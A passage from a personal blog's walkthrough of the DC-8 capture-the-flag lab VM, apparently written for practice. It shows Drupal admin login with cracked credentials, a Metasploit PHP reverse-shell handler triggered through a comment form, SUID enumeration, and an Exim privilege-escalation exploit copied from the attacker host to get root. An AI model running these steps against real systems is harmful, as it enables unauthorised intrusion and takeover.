+<ul>
+<li><p>把上面的结果写到一个文件里面，然后使用 <code>Johnny</code> 把文件导入进去</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504224312509.png" alt="image-20200504224312509"></p>
+</li>
+<li><p>这里值只看了john的密码: <code>turtle</code></p>
+</li>
+<li><p>然后我们就能去登录后台试试</p>
+</li>
+<li><p>Drupal的后台默认在/user/login下</p>
+</li>
+<li><p>直接访问：<a href="http://192.168.0.29/user/login，账号" target="_blank" rel="noopener">http://192.168.0.29/user/login，账号</a> <code>john</code> 密码 <code>turtle</code></p>
+</li>
+<li><p>然后就登录进去了</p>
+</li>
+<li><p>拿shell</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504224920158.png" alt="image-20200504224920158"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504224947210.png" alt="image-20200504224947210"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504225005560.png" alt="image-20200504225005560"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504225051840.png" alt="image-20200504225051840"></p>
+</li>
+<li><p>我这里用的是<code>metasploit</code></p>
+</li>
+<li><p>先 <code>msfconsole</code></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.0.21</span><br><span class="line">LHOST =&gt; 192.168.0.21</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.21:4444</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后到网站去提交一个留言</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504225740483.png" alt="image-20200504225740483"></p>
+</li>
+<li><p>msf就得到了会话</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>就可以进到shell了</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获得标准shell</span></span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line"><span class="comment"># 然后找其他用户看看是否有什么发现</span></span><br><span class="line"><span class="built_in">cd</span> /home;ls</span><br><span class="line">dc8user</span><br><span class="line">ls -l dc8user</span><br><span class="line"><span class="comment"># 啥也没有</span></span><br><span class="line"><span class="comment"># 然后使用</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 找suid的文件提权，结果如下：</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img data-src="../images/mdImages/image-20200504230239506.png" alt="image-20200504230239506"></p>
+</li>
+<li><p>几经周转了解到<code>exim4</code>有已知的提权漏洞</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim</span><br><span class="line">Exim 4.87 - 4.91 - Local Privilege Escalation   | exploits/linux/<span class="built_in">local</span>/46996.sh</span><br><span class="line"><span class="comment"># 使用的是46996.sh</span></span><br><span class="line"><span class="comment"># 先把他复制到/tmp下改成exp.sh</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在靶机shell执行 </span></span><br><span class="line">scp root@192.168.0.21:/tmp/exp.sh /tmp</span><br><span class="line"><span class="comment"># 然后执行</span></span><br><span class="line">./exp.sh -m netcat</span><br><span class="line"><span class="comment"># 就能得到root的shell了</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img data-src="../images/mdImages/image-20200504232730631.png" alt="image-20200504232730631"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504232745210.png" alt="image-20200504232745210"></p>
+</li>
+</ul>
+<h2><span id="the_end"><strong>THE_END!</strong></span></h2>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 网络渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Docker-Install/" rel="prev" title="Docker的安装">
+      <i class="fa fa-chevron-left"></i> Docker的安装
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/DC-9/" rel="next" title="DC-9 靶机渗透">
+      DC-9 靶机渗透 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-text">DC-8 靶机渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">1. 渗透过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">THE_END!</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Rex_Surprise"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Rex_Surprise</p>
+  <div class="site-description" itemprop="description">Rex_Surprise的个人博客~</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/rexSurprise" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rexSurprise" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_44911239" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44911239" rel="noopener" target="_blank"><i class="fab fa-stack-overflow fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://fanyi.baidu.com/" title="http:&#x2F;&#x2F;fanyi.baidu.com" rel="noopener" target="_blank">百度翻译</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://39.97.126.84/" title="http:&#x2F;&#x2F;39.97.126.84" rel="noopener" target="_blank">我的小站</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Rex_Surprise</span>
+    <span class="post-meta-divider"><br/></span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">11k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">10 分钟</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+	  <span>本站访问人数:</span>
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+		<span>本站访问次数:</span>
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="400" alpha="0.25" zIndex="-1" src="//cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lozad.js/1.14.0/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '5lI8es3hCNbfGw1bfoVdtl4Y-gzGzoHsz',
+      appKey     : 'RB9CwHU5LBvHFAGzGa8M8fcO',
+      placeholder: "谈谈你的看法(支持Markdown)",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '8' || 10,
+      visitor    : true,
+      lang       : 'zh-CN' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
